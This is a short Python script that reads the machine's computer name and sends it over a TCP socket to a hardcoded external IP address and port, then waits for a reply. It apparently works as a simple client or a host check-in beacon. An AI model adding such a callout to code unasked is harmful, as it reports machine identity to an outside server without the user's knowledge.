import socket
import os

computer_name = os.getenv('COMPUTERNAME')

server_host = '217.71.129.139'
server_port = 4645

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((server_host, server_port))
    s.sendall(computer_name.encode('utf-8'))

    data = s.recv(1024)
